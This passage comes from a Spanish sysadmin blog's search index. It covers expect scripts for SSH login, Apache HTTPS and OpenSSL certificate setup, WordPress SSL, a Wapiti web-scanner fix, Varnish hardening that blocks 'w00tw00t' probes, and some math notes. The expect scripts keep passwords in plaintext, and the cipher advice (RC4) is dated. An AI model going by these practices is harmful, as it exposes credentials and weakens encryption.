clave para conectarnos. El siguiente script muestra cómo podemos conectarnos utilizando el usuario y la contraseña escritos en el propio script : ```bash !/usr/bin/env expect http://ubuntuforums.org/showpost.php?p=5433300&postcount=5 trap sigwinch and pass it to the child we spawned trap { set rows [stty rows] set cols [stty columns] stty rows $rows columns $cols < $spawn_out(slave,name) } WINCH set username yourUserNameHere set pass yourPasswordHere set host theIpAddressToConnectTo spawn ssh \\({username}@\\) {host} expect -re \"password:\" send \"${pass}\\r\" expect -re \"$\" now interact with the session interact ``` Podríamos modificar el script para que nos pida los parámetros, y pasárselos como argumentos desde el terminal. Deberíamos cambiar las líneas dónde se definen dichas variables por: bash set username [lrange $argv 0 0] set pass [lrange $argv 1 1] set host [lrange $argv 2 2] Y desde el terminal, lo invocaríamos mediante: bash $ ./sshlogin.ssh username pass host Conectarse a un servidor SSH, ejecutar un comando y salir Otra opción es que nos queramos conectar para ejecutar un comando , ver el resultado y salir. Un sencillo script que nos permite hacer esto es el siguiente: ```bash !/usr/bin/expect -f http://bash.cyberciti.biz/security/expect-ssh-login-script/ set user [lrange $argv 0 0] set ip_or_domain [lrange $argv 1 1] set password [lrange $argv 2 2] set scriptname [lrange $argv 3 3] set arg1 [lrange $argv 4 4] set timeout -1 now connect to remote UNIX box (ip_or_domain) with given script to execute spawn ssh \\(user@\\) ip_or_domain $scriptname $arg1 match_max 100000 Look for passwod prompt expect \" ?assword: \" Send password aka $password send -- \"$password\\r\" send blank line (\\r) to make sure we get back to gui send -- \"\\r\" expect eof ``` Para ejecutarlo: bash $ ./sshlogin.exp user host pass who La principal diferente entre estos dos scripts es que, después de enviar la contraseña, uno espera a que se muestre el prompt para iniciar una sesión interactiva mediante la orden interact y el otro simplemente cierra la sesión. Utilizar expect en el terminal También podríamos ejecutar expect directamente en el terminal de la siguiente manera: bash $ expect -c \" set password pass spawn ssh user@host who match_max 100000 expect \\\"_?assword:_\\\" send -- \\\"${password}\\r\\\" send -- \\\"\\r\\\" expect eof \" if (!document.getElementById('mathjaxscript_pelican_#%@#$@#')) { var align = \"center\", indent = \"0em\", linebreak = \"false\"; if (false) { align = (screen.width < 768) ? \"left\" : align; indent = (screen.width < 768) ? \"0em\" : indent; linebreak = (screen.width < 768) ? 'true' : linebreak; } var mathjaxscript = document.createElement('script'); mathjaxscript.id = 'mathjaxscript_pelican_#%@#$@#'; mathjaxscript.type = 'text/javascript'; mathjaxscript.src = 'https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.3/latest.js?config=TeX-AMS-MML_HTMLorMML'; var configscript = document.createElement('script'); configscript.type = 'text/x-mathjax-config'; configscript[(window.opera ? \"innerHTML\" : \"text\")] = \"MathJax.Hub.Config({\" + \" config: ['MMLorHTML.js'],\" + \" TeX: { extensions: ['AMSmath.js','AMSsymbols.js','noErrors.js','noUndefined.js'], equationNumbers: { autoNumber: 'none' } },\" + \" jax: ['input/TeX','input/MathML','output/HTML-CSS'],\" + \" extensions: ['tex2jax.js','mml2jax.js','MathMenu.js','MathZoom.js'],\" + \" displayAlign: '\"+ align +\"',\" + \" displayIndent: '\"+ indent +\"',\" + \" showMathMenu: true,\" + \" messageStyle: 'normal',\" + \" tex2jax: { \" + \" inlineMath: [ ['\\\\\\\\(','\\\\\\\\)'] ], \" + \" displayMath: [ ['$$','$$'] ],\" + \" processEscapes: true,\" + \" preview: 'TeX',\" + \" }, \" + \" 'HTML-CSS': { \" + \" availableFonts: ['STIX', 'TeX'],\" + \" preferredFont: 'STIX',\" + \" styles: { '.MathJax_Display, .MathJax .mo, .MathJax .mi, .MathJax .mn': {color: 'inherit ! important'} },\" + \" linebreaks: { automatic: \"+ linebreak +\", width: '90% container' },\" + \" }, \" + \"}); \" + \"if ('default' !== 'default') {\" + \"MathJax.Hub.Register.StartupHook('HTML-CSS Jax Ready',function () {\" + \"var VARIANT = MathJax.OutputJax['HTML-CSS'].FONTDATA.VARIANT;\" + \"VARIANT['normal'].fonts.unshift('MathJax_default');\" + \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" + \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" + \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" + \"});\" + \"MathJax.Hub.Register.StartupHook('SVG Jax Ready',function () {\" + \"var VARIANT = MathJax.OutputJax.SVG.FONTDATA.VARIANT;\" + \"VARIANT['normal'].fonts.unshift('MathJax_default');\" + \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" + \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" + \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" + \"});\" + \"}\"; (document.body || document.getElementsByTagName('head')[0]).appendChild(configscript); (document.body || document.getElementsByTagName('head')[0]).appendChild(mathjaxscript); }","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/06/17/conectarse-por-ssh-utilizando-expect/","loc":"https://karpoke.ignaciocano.com/2011/06/17/conectarse-por-ssh-utilizando-expect/"},{"title":"Encontrar los dominios que comparten IP con otro dado","text":"Éste es algo viejuno, pero lo no había probado. Se trata del script bing-ip2hosts , que permite encontrar los dominios que comparten IP con un dominio dado utilizando Bing: bash $ ./bing-ip2hosts -p ubuntu.com http://brainstorm.ubuntu.com http://kubuntu.org http://search.ubuntu.com http://www.ubuntu.com Con el argumento -p se incluye el prefijo http:// , lo cual viene bien para poder clicar directamente en el terminal. Este script utiliza el comando resolveip para encontrar la IP del dominio dado: ```bash $ resolveip google.com IP address of google.com is 209.85.146.147 IP address of google.com is 209.85.146.99 IP address of google.com is 209.85.146.104 IP address of google.com is 209.85.146.106 IP address of google.com is 209.85.146.103 IP address of google.com is 209.85.146.105 $ resolveip -s google.com 209.85.229.147 ``` Y parsea los resultados del buscador Bing pasándole como parámetro la IP recién obtenida: bash http://m.bing.com/search/search.aspx?A=webresults&Q=ip%3a209.85.229.147&D=Web&SI=0","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/06/14/encontrar-los-dominios-que-comparten-ip-con-otro-dado/","loc":"https://karpoke.ignaciocano.com/2011/06/14/encontrar-los-dominios-que-comparten-ip-con-otro-dado/"},{"title":"Usando una conexión segura en el panel de control de Wordpress","text":"Si tenemos instalado un WordPress y queremos iniciar sesión a través de una conexión segura , deberemos modificar el fichero /usr/share/wordpress/wp-config.php y añadir: php define('FORCE_SSL_LOGIN', true); Si queremos que se use la conexión segura en todo el panel de control, en lugar de lo anterior, añadiremos: php define('FORCE_SSL_ADMIN', true); Para que esto funcione, es necesario que Apache esté configurado para servir conexiones seguras . Actualización a 13 de julio de 2013 Si hemos iniciado sesión y navegamos por nuestra página web, deberíamos asegurarnos de que seguimos usando una conexión segura, ya que estamos enviando nuestra cookie de sesión y alguien en la misma red podría llegar a capturarla si no es así. El complemento SSL for logged in users fuerza que los usuarios que han iniciado sesión continúen usando una conexión segura en todo el sitio. Además, con este complemento, ya no será necesario modificar el fichero wp-config.php .","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/06/14/usando-una-conexion-segura-en-el-panel-de-control-de-wordpress/","loc":"https://karpoke.ignaciocano.com/2011/06/14/usando-una-conexion-segura-en-el-panel-de-control-de-wordpress/"},{"title":"Configurar Apache para servir conexiones seguras","text":"Si tenemos Apache, y queremos configurarlo para que se pueda navegar de forma segura por nuestro sitio utilizando el protocolo HTTPS, necesitamos: crear las claves que se utilizarán para cifrar la conexión, configurar mod_ssl , el módulo de Apache para usar conexiones seguras, y permitir la conexión por el puerto 443. Crear las claves de cifrado Vamos a generar un par de claves RSA triple DES de 2048 bits en el directorio /etc/ssl : bash $ cd /etc/ssl $ sudo openssl genrsa -des3 -out server.key 2048 Nos pedirá una contraseña y al terminar nos habrá creado la clave server.key que será la que utilizará Apache. Le cambiamos los permisos: bash $ sudo chmod 700 server.key y guardamos una copia en un lugar seguro. Si pensamos utilizar más de un VirtualHost podría ser interesante utilizar el dominio para el nombre de la clave en lugar de server.key . Cada vez que se inicie Apache nos pedirá la contraseña que acabamos de dar. Si no queremos que nos vuelva a pedir la contraseña , ejecutamos lo siguiente, y utilizamos la nueva clave obtenida: bash $ sudo openssl rsa -in server.key -out new.server.key Nuestra clave necesita estar avalada por alguien , por lo que creamos una petición de firmado de nuestra clave. Que no se nos pase poner la dirección de nuestra web en Common Name . bash $ sudo openssl req -new -key server.key -out server.csr Country Name (2 letter code) [AU]:ES State or Province Name (full name) [Some-State]:IB Locality Name (eg, city) []:Palma de Mallorca Organization Name (eg, company) [Internet Widgits Pty Ltd]:Terminus Common Name (eg, YOUR name) []:terminus.ignaciocano.com Email Address []:karpoke@spamme.com Actualizado el 22 de mayo de 2015 Podemos usar la opción -subj para pasarle esta información directamente al comando openssl : bash $ sudo openssl req -new -key server.key -out server.csr -subj '/C=ES/ST=IB/L=Palma de Mallorca/O=Terminus/CN=terminus.ignaciocano.com/emailAddress=karpoke@spamme.com' También podemos consultar esta información del fichero de petición con la opción -subject : bash $ openssl req -in server.csr -noout -subject subject=/C=ES/ST=IB/L=Palma de Mallorca/O=Terminus/CN=terminus.ignaciocano.com/emailAddress=karpoke@spamme.com Si queremos crear un certificado wildcard , válido para todos los subdominios de un dominio, en Common Name bastará que pongamos algo como por ejemplo *.ignaciocano.com . Después de ejecutar el comando, se habrá creado el fichero con la petición de firmado de nuestra clave, server.csr . Ahora deberíamos entregar esta petición a una entidad certificadora para que nuestro certificado esté avalado por una CA como Verisign o Thawte, y así evitar que un usuario que acceda a nuestra web le salga el aviso de que el certificado del sitio no puede ser validado. Pero si estamos haciendo pruebas, tenemos dos opciones para nuestra petición, o autofirmarla, o crear una autoridad certificadora (CA) y firmarla. Autofirmar la petición Crearemos un certificado autofirmado, server.crt , con una validez de un año: bash $ sudo openssl x509 -req -days 365 -in server.csr -signkey server.key -out server.crt Country Name (2 letter code) [AU]:ES State or Province Name (full name) [Some-State]:IB Locality Name (eg, city) []:Palma de Mallorca Organization Name (eg, company) [Internet Widgits Pty Ltd]:Terminus Common Name (eg, YOUR name) []:terminus.ignaciocano.com Email Address []:karpoke@spamme.com Crear una autoridad certificadora y firmar el certificado En lugar de autofirmar el certificado, podemos crear una autoridad certificadora utilizando un pequeño script incluido con openssl . bash $ sudo /usr/lib/ssl/misc/CA.sh -newca Country Name (2 letter code) [AU]:ES State or Province Name (full name) [Some-State]:IB Locality Name (eg, city) []:Palma de Mallorca Organization Name (eg, company) [Internet Widgits Pty Ltd]:Terminus CA Organizational Unit Name (eg, section) []: Common Name (eg, YOUR name) []:terminus.ignaciocano.com Email Address []:karpoke@spamme.com Nos pedirá una contraseña para el certificado de nuestra CA. Una vez que termine, se habrá creado el directorio /etc/ssl/demoCA , que contiene el certificado de nuestra CA. Algunos programas tienen problemas con los certificados que no son DER, por lo que convertiremos el nuestro: bash $ sudo openssl x509 -in demoCA/cacert.pem -out demoCA/cacert.der -outform DER Renombramos el fichero del certificado, ya que así lo exige el script que utilizaremos para firmar: bash $ sudo mv server.csr newreq.pem Y firmamos el certificado. Nos pedirá la contraseña que le dimos al certificado de la CA y nos pedirá confirmación para firmar la petición: bash $ sudo /usr/lib/ssl/misc/CA.sh -signreq Volvemos a renombrar el certificado firmado: bash $ sudo mv newcert.pem server.crt Configurar Apache para que use el certificado Movemos el certificado y la clave del servidor a los siguientes directorios: bash $ sudo mv server.crt /etc/ssl/certs/ $ sudo mv server.key /etc/ssl/private/ Activamos el módulo mod_ssl de Apache: bash $ sudo a2enmod ssl Editamos la configuración del sitio por defecto para SSL , en el fichero /etc/apache2/sites-available/default-ssl para que incluya: bash SSLEngine on SSLOptions +FakeBasicAuth +ExportCertData +StrictRequire SSLCertificateFile /etc/ssl/certs/server.crt SSLCertificateKeyFile /etc/ssl/private/server.key El significado de las SSLOptions es el siguiente: FakeBasicAuth , permite utilizar los métodos estándar Auth/DBMAuth para controlar el acceso, ExportCertData , exporta las variables de entorno SSL_CLIENT_CERT y SSL_SERVER_CERT , StrictRequire , deniega el acceso cuando se utilice SSLRequireSSL o SSLRequire Activamos la configuración para que el sitio use SSL : bash $ sudo a2ensite default-ssl Escuchando en el puerto 443 Debemos asegurarnos de que Apache está configurado para escuchar en el puerto 443, el puerto bien definido para HTTPS, por lo que en el fichero /etc/apache2/ports.conf , debería haber algo como: # If you add NameVirtualHost *:443 here, you will also have to change # the VirtualHost statement in /etc/apache2/sites-available/default-ssl # to # Server Name Indication for SSL named virtual hosts is currently not # supported by MSIE on Windows XP. Listen 443 Sólo queda reiniciar el servicio: bash $ sudo apache2ctl graceful Y asegurarnos de que la NAT del router está configurada correctamente, si es que la usamos, o de que el cortafuegos deja pasar las peticiones por el puerto 443. Actualización el día 24 de marzo de 2013 Cuando se haya pasado un año, deberemos renovar el certificado. Primero, generamos, de nuevo, una petición de certificación de un año, tal como hicimos al crear el certificado. El nombre del fichero debe ser newreq.pem : bash $ sudo openssl req -new -key /etc/ssl/private/server.key -out /etc/ssl/newreq.pem Firmamos el certificado: bash $ sudo /usr/lib/ssl/misc/CA.sh -signreq Renombramos el certificado firmado y lo movemos al directorio correspondiente: bash $ sudo mv /etc/ssl/{newcert.pem,certs/server.crt} Y ya sólo queda reiniciar Apache. bash $ sudo apache2ctl graceful Podemos comprobar las fechas de validez del certificado ejecutando: bash $ sudo openssl x509 -noout -dates -in /etc/ssl/certs/server.crt notBefore=Mar 24 11:52:07 2013 GMT notAfter=Mar 24 11:52:07 2014 GMT O podemos obtenerlo directamente del servidor web: bash $ openssl s_client -showcerts -connect terminus.ignaciocano.com:443 Bonus Para comprobar la calidad de una conexión segura , podemos usar nuevamente el comando openssl . Siguiendo los criterios del artículo enlazado, comprobamos que no dé soporte a SSL v2, ya que se puede considerar obsoleto: bash $ openssl s_client -ssl2 -connect localhost:443 CONNECTED(00000003) 19609:error:1407F0E5:SSL routines:SSL2_WRITE:ssl handshake failure:s2_pkt.c:428 Vemos que no cumplimos con la validación extendida en el certificado, pero es que hemos usado nuestra propia autoridad certificadora. Comprobamos que la longitud de la clave es la mínima aceptable: bash $ openssl s_client -connect localhost:443 Server public key is 2048 bit Por último, comprobamos que no admita algoritmos débiles, cuya longitud de clave sea de 56 ó 64 bits: bash $ openssl s_client -cipher LOW:EXP -connect localhost:443 CONNECTED(00000003) 1433:error:14077410:SSL routines:SSL23_GET_SERVER_HELLO:sslv3 alert handshake failure:s23_clnt.c:596: Actualización el día 24 de marzo de 2013 También podemos utilizar un servicio externo, como SSL Server Test, de Qualys SSL Labs . Si nos aparece que nuestro certificado es vulnerable al ataque BEAST, podemos mitigarlo utilizando las siguientes directivas en la configuración de Apache: bash SSLHonorCipherOrder On SSLCipherSuite ECDHE-RSA-AES128-SHA256:AES128-GCM-SHA256:RC4:HIGH:!MD5:!aNULL:!EDH Más información: - ivanr Mitigating the BEAST attack on TLS - ivanr RC4 in TLS is Broken: Now What? Actualizado el día 25 de enero de 2015 Dado que SHA1 va quedando obsoleto, es conveniente ir actualizando el certificado. Creamos la petición de firmado del certificado: bash $ sudo openssl req -new -sha256 -key /etc/ssl/private/server.key -out /etc/ssl/newreq.pem Confirmamos la información de la petición: bash $ sudo openssl req -in /etc/ssl/newreq.pem -text -noout Firmamos la petición: bash $ sudo /usr/lib/ssl/misc/CA.sh -signreq Movemos el certificado al directorio correspondiente: bash $ sudo mv /etc/ssl/{newcert.pem,certs/server.crt} Reiniciamos apache : bash $ sudo apache2ctl restart Utilidades Algunas utilidades para analizar la configuración SSL del servidor: » TLSSLed » SSLyze","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/06/14/configurar-apache-para-servir-conexiones-seguras/","loc":"https://karpoke.ignaciocano.com/2011/06/14/configurar-apache-para-servir-conexiones-seguras/"},{"title":"UnicodeDecodeError con Wapiti","text":"Wapiti es un escáner de vulnerabilidades web basado en fuzzing . En la última versión, 2.2.1 , permite detectar vulnerabilidades referente a: Errores de gestión de ficheros (include/require local y remoto, fopen, readfile...) Database Injection (PHP/JSP/ASP SQL Injections y XPath Injections) XSS (Cross Site Scripting) Injection LDAP Injection Command Execution detection (eval(), system(), passtru()...) CRLF Injection (HTTP Response Splitting, session fixation...) Sin embargo, si usamos Ubuntu Natty Narwhal, la versión de los repositorios es la 1.1.6, por lo que es posible que nos encontremos el siguiente error al escanear páginas que contengan caracteres no ASCII . Por ejemplo: bash $ wapiti http://127.0.0.1/ -v 1 -m GET_XSS -u Wapiti-1.1.6 (wapiti.sourceforge.net) Traceback (most recent call last): File \"/usr/bin/wapiti\", line 943, in wap.browse() File \"/usr/bin/wapiti\", line 123, in browse self.myls.go() File \"/usr/share/wapiti/lswww.py\", line 396, in go if self.browse(lien): File \"/usr/share/wapiti/lswww.py\", line 207, in browse p.feed(htmlSource) File \"/usr/lib/python2.7/HTMLParser.py\", line 108, in feed self.goahead(0) File \"/usr/lib/python2.7/HTMLParser.py\", line 148, in goahead k = self.parse_starttag(i) File \"/usr/lib/python2.7/HTMLParser.py\", line 252, in parse_starttag attrvalue = self.unescape(attrvalue) File \"/usr/lib/python2.7/HTMLParser.py\", line 393, in unescape return re.sub(r\"&(#?[xX]?(?:[0-9a-fA-F]+|\\w{1,8}));\", replaceEntities, s) File \"/usr/lib/python2.7/re.py\", line 151, in sub return _compile(pattern, flags).sub(repl, string, count) UnicodeDecodeError: 'ascii' codec can't decode byte 0xc2 in position 0: ordinal not in range(128) Parece ser que este error está solucionado en la versión en desarrollo , por lo que lo mejor sería probar la última versión . Aún así, podemos evitarlo modificando el fichero vim /usr/share/wapiti/lswww.py , y cambiando las ocurrencias de: python p.feed(htmlSource) por: python p.feed(htmlSource.decode(\"utf-8\", \"replace\"))","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/05/28/unicodedecodeerror-con-wapiti/","loc":"https://karpoke.ignaciocano.com/2011/05/28/unicodedecodeerror-con-wapiti/"},{"title":"¿Dónde está el site-packages?","text":"Nota mental: bash $ python -c \"from distutils.sysconfig import get_python_lib; print get_python_lib()\" /usr/lib/python2.7/dist-packages Ligeramente relacionado » Creando y leyendo códigos QR desde Python A lo mejor, si el intérprete de Python no encuentra un paquete es que no está donde debería... :facepalm:","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/05/28/donde-esta-el-site-packages/","loc":"https://karpoke.ignaciocano.com/2011/05/28/donde-esta-el-site-packages/"},{"title":"Mejorando la seguridad de Apache con Varnish","text":"Varnish es un acelerador web, que puede ser utilizado tanto para cachear contenido estático de nuestro servidor, para balancear la carga o para incrementar la seguridad , por ejemplo, bloqueando cierto tipo de peticiones u ocultando cierto tipo de información. Se instala directamente de los repositorios: bash $ sudo aptitude install varnish Ahora lo configuraremos para utilizarlo como capa intermedia, delante de nuestro Apache. Editamos el fichero /etc/default/varnish y cambiamos: bash DAEMON_OPTS=\"-a :6081 -T localhost:6082 -f /etc/varnish/default.vcl -S /etc/varnish/secret -s file,/var/lib/varnish/$INSTANCE/varnish_storage.bin,1G\" por: bash DAEMON_OPTS=\"-a :80 -T localhost:6082 -f /etc/varnish/000-default.vcl -S /etc/varnish/secret -s file,/var/lib/varnish/$INSTANCE/varnish_storage.bin,1G\" En el fichero /etc/varnish/000-default.vcl específicamos las reglas que queremos aplicar a las peticiones que le van a llegar a Apache. Podemos eliminar cabeceras o modificarlas , por ejemplo, cambiando el nombre y la versión de Apache. Conviene recordar que cambiar el nombre del servidor, no lo hace más seguro. También podemos descartar peticiones que cumplan algún criterio, por ejemplo que contenga la cadena \"w00tw00t\" . ```bash Redirect requests to Apache, running on port 8000 on localhost backend apache { .host = \"127.0.0.1\"; .port = \"8080\"; } Fetch sub vcl_fetch { ## Change server signature unset obj.http.Server; set obj.http.Server = \"Unknown\"; ## Remove the X-Forwarded-For header if it exists. remove req.http.X-Forwarded-For; ## insert the client IP address as X-Forwarded-For. This is the normal IP address of the user. set req.http.X-Forwarded-For = req.http.rlnclientipaddr; ## Added security, the \"w00tw00t\" attacks are pretty annoying so lets block it before it reaches our webserver if (req.url ~ \"&#94;/w00tw00t\") { error 403 \"Not permitted\"; } ## Deliver the content return(deliver); } Deliver sub vcl_deliver { ## We'll be hiding some headers added by Varnish. We want to make sure people are not seeing we're using Varnish. ## Since we're not caching (yet), why bother telling people we use it? remove resp.http.X-Varnish; remove resp.http.Via; remove resp.http.Age; ## We'd like to hide the X-Powered-By headers. Nobody has to know we can run PHP and have version xyz of it. remove resp.http.X-Powered-By; } ``` Ahora, cambiamos el puerto en el que escucha Apache, editando el fichero /etc/apache2/ports.conf : bash NameVirtualHost *:8080 Listen 127.0.0.1:8080 También debemos editamos nuestros hosts virtuales, por ejemplo, /etc/apache2/sites-enabled/default , y cambiamos: bash por: bash Tras hacer este cambio, el único que «hablará» con Apache será Varnish, por lo que la única IP que veremos será la 127.0.0.1 . Instalaremos un módulo extra de Apache para asegurarnos de que la IP es la correcta: bash $ sudo aptitude install libapache2-mod-rpaf $ sudo a2enmod rpaf RPAF (Reverse Proxy Add Forward) reemplazará la IP por la que Varnish habrá puesto en la cabecera X-Forwarded-For . Reiniciamos los servicios: bash $ sudo service apache2 restart $ sudo service varnish restart Si todo ha ido bien, Varnish deberá estar escuchando en el puerto 80 y Apache en el 8080: bash $ sudo netstat -lp | grep apache2 tcp 0 0 localhost:http-alt _:_ ESCUCHAR 2587/apache2 bash $ sudo netstat -lp | grep varnishd tcp 0 0 _:www *:_ ESCUCHAR 9452/varnishd tcp 0 0 localhost:6082 _:_ ESCUCHAR 9451/varnishd tcp6 0 0 [::]:www [::]:* ESCUCHAR 9452/varnishd Previously » Cabeceras HTTP » Ocultando cabeceras » Cabeceras HTTPS personalizadas en Apache2 » w00tw00t en los logs de Apache \"ocultando cabeceras en Apache\" \"cabeceras http\" \"Cabeceras HTTP personalizadas en Apache2\" \"w00tw00t\" \"Cabeceras HTTP\" \"Ocultando cabeceras\" \"Cabeceras HTTPS personalizadas en Apache2\"","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/05/26/mejorando-la-seguridad-de-apache-con-varnish/","loc":"https://karpoke.ignaciocano.com/2011/05/26/mejorando-la-seguridad-de-apache-con-varnish/"},{"title":"localepurge","text":"localepurge es una herramienta que elimina los archivos de traducción que no necesitemos. Después de instalarlo, nos pedirá que seleccionemos qué idiomas queremos conservar : en_US en_US.ISO-8859-15 en_US.UTF-8 es es_ES es_ES@euro es_ES.UTF-8 Después de instalarlo, lo ejecutamos: bash $ sudo localepurge Total disk space freed by localepurge: 26552 KiB Cada vez que instalemos un nuevo paquete de los respositorios se ejecutará automáticamente, por lo que no tendremos que volver a preocuparnos. Actualización a 17 de marzo de 2013 Acabo de encontrar una anotación interesante en el blog del crysol . En lugar de eliminar las traducciones que no nos interesan, podemos, directamente, evitar descargarlas. Editamos el fichero /etc/apt/apt.conf.d/99Translations , y añadimos lo que necesitemos, por ejemplo: bash Acquire::Languages:: \"es\"; Acquire::Languages:: \"es_ES\"; O, mejor aún, si no queremos bajar ninguna traducción: bash Acquire::Languages:: \"none\"; Podemos ver la configuración con el comando apt-config : bash $ apt-config dump | grep Lang Acquire::Languages \"\"; A partir de ahora, las actualizaciones deberían ir algo más rápidas.","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/05/25/localepurge/","loc":"https://karpoke.ignaciocano.com/2011/05/25/localepurge/"},{"title":"0.999...=1","text":"$$ \\large\\begin{align*} \\frac{1}{3} &= 0.\\stackrel{\\frown}{3} \\\\ \\frac{1}{3} &= 0.333\\dots \\\\ 3 \\cdot \\frac{1}{3} &= 3 \\cdot 0.333\\dots \\\\ 1 &= 0.999\\dots \\\\ 1 &= 0.\\stackrel{\\frown}{9} \\end{align*} $$ if (!document.getElementById('mathjaxscript_pelican_#%@#$@#')) { var align = \"center\", indent = \"0em\", linebreak = \"false\"; if (false) { align = (screen.width < 768) ? \"left\" : align; indent = (screen.width < 768) ? \"0em\" : indent; linebreak = (screen.width < 768) ? 'true' : linebreak; } var mathjaxscript = document.createElement('script'); mathjaxscript.id = 'mathjaxscript_pelican_#%@#$@#'; mathjaxscript.type = 'text/javascript'; mathjaxscript.src = 'https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.3/latest.js?config=TeX-AMS-MML_HTMLorMML'; var configscript = document.createElement('script'); configscript.type = 'text/x-mathjax-config'; configscript[(window.opera ? \"innerHTML\" : \"text\")] = \"MathJax.Hub.Config({\" + \" config: ['MMLorHTML.js'],\" + \" TeX: { extensions: ['AMSmath.js','AMSsymbols.js','noErrors.js','noUndefined.js'], equationNumbers: { autoNumber: 'none' } },\" + \" jax: ['input/TeX','input/MathML','output/HTML-CSS'],\" + \" extensions: ['tex2jax.js','mml2jax.js','MathMenu.js','MathZoom.js'],\" + \" displayAlign: '\"+ align +\"',\" + \" displayIndent: '\"+ indent +\"',\" + \" showMathMenu: true,\" + \" messageStyle: 'normal',\" + \" tex2jax: { \" + \" inlineMath: [ ['\\\\\\\\(','\\\\\\\\)'] ], \" + \" displayMath: [ ['$$','$$'] ],\" + \" processEscapes: true,\" + \" preview: 'TeX',\" + \" }, \" + \" 'HTML-CSS': { \" + \" availableFonts: ['STIX', 'TeX'],\" + \" preferredFont: 'STIX',\" + \" styles: { '.MathJax_Display, .MathJax .mo, .MathJax .mi, .MathJax .mn': {color: 'inherit ! important'} },\" + \" linebreaks: { automatic: \"+ linebreak +\", width: '90% container' },\" + \" }, \" + \"}); \" + \"if ('default' !== 'default') {\" + \"MathJax.Hub.Register.StartupHook('HTML-CSS Jax Ready',function () {\" + \"var VARIANT = MathJax.OutputJax['HTML-CSS'].FONTDATA.VARIANT;\" + \"VARIANT['normal'].fonts.unshift('MathJax_default');\" + \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" + \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" + \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" + \"});\" + \"MathJax.Hub.Register.StartupHook('SVG Jax Ready',function () {\" + \"var VARIANT = MathJax.OutputJax.SVG.FONTDATA.VARIANT;\" + \"VARIANT['normal'].fonts.unshift('MathJax_default');\" + \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" + \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" + \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" + \"});\" + \"}\"; (document.body || document.getElementsByTagName('head')[0]).appendChild(configscript); (document.body || document.getElementsByTagName('head')[0]).appendChild(mathjaxscript); }","tags":"memo","url":"https://karpoke.ignaciocano.com/2011/05/18/0-coma-9-periodo-igual-1/","loc":"https://karpoke.ignaciocano.com/2011/05/18/0-coma-9-periodo-igual-1/"},{"title":"0!=1!","text":"$$ \\large\\begin{align*} n! &= n \\cdot (n-1) \\cdot (n-2) \\cdots 3 \\cdot 2 \\cdot 1 \\\\ n! &= n \\cdot (n-1)! \\\\ (n-1)! &= \\frac{n!}{n} \\end{align*} $$ Si tomamos \\(n=1\\) : $$ \\large\\begin{align*} (1-1)! &= \\frac{1!}{1} \\\\ 0! &= 1 \\end{align*} $$ if (!document.getElementById('mathjaxscript_pelican_#%@#$@#')) { var align = \"center\", indent = \"0em\", linebreak = \"false\"; if (false) { align = (screen.width < 768) ? \"left\" : align; indent = (screen.width < 768) ? \"0em\" : indent; linebreak = (screen.width < 768) ? 'true' : linebreak; } var mathjaxscript = document.createElement('script'); mathjaxscript.id = 'mathjaxscript_pelican_#%@#$@#'; mathjaxscript.type = 'text/javascript'; mathjaxscript.src = 'https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.3/latest.js?config=TeX-AMS-MML_HTMLorMML'; var configscript = document.createElement('script'); configscript.type = 'text/x-mathjax-config'; configscript[(window.opera ? \"innerHTML\" : \"text\")] = \"MathJax.Hub.Config({\" + \" config: ['MMLorHTML.js'],\" + \" TeX: { extensions: ['AMSmath.js','AMSsymbols.js','noErrors.js','noUndefined.js'], equationNumbers: { autoNumber: 'none' } },\" + \" jax: ['input/TeX','input/MathML','output/HTML-CSS'],\" + \" extensions: ['tex2jax.js','mml2jax.js','MathMenu.js','MathZoom.js'],\" + \" displayAlign: '\"+ align +\"',\" + \" displayIndent: '\"+ indent +\"',\" + \" showMathMenu: true,\" + \" messageStyle: 'normal',\" + \" tex2jax: { \" + \" inlineMath: [ ['\\\\\\\\(','\\\\\\\\)'] ], \" + \" displayMath: [ ['$$','$$'] ],\" + \" processEscapes: true,\" + \" preview: 'TeX',\" + \" }, \" + \" 'HTML-CSS': { \" + \" availableFonts: ['STIX', 'TeX'],\" + \" preferredFont: 'STIX',\" + \" styles: { '.MathJax_Display, .MathJax .mo, .MathJax .mi, .MathJax .mn': {color: 'inherit ! important'} },\" + \" linebreaks: { automatic: \"+ linebreak +\", width: '90% container' },\" + \" }, \" + \"}); \" + \"if ('default' !== 'default') {\" + \"MathJax.Hub.Register.StartupHook('HTML-CSS Jax Ready',function () {\" + \"var VARIANT = MathJax.OutputJax['HTML-CSS'].FONTDATA.VARIANT;\" + \"VARIANT['normal'].fonts.unshift('MathJax_default');\" + \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" + \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" + \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" + \"});\" + \"MathJax.Hub.Register.StartupHook('SVG Jax Ready',function () {\" + \"var VARIANT = MathJax.OutputJax.SVG.FONTDATA.VARIANT;\" + \"VARIANT['normal'].fonts.unshift('MathJax_default');\" + \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" + \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" + \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" + \"});\" + \"}\"; (document.body || document.getElementsByTagName('head')[0]).appendChild(configscript); (document.body || document.getElementsByTagName('head')[0]).appendChild(mathjaxscript); 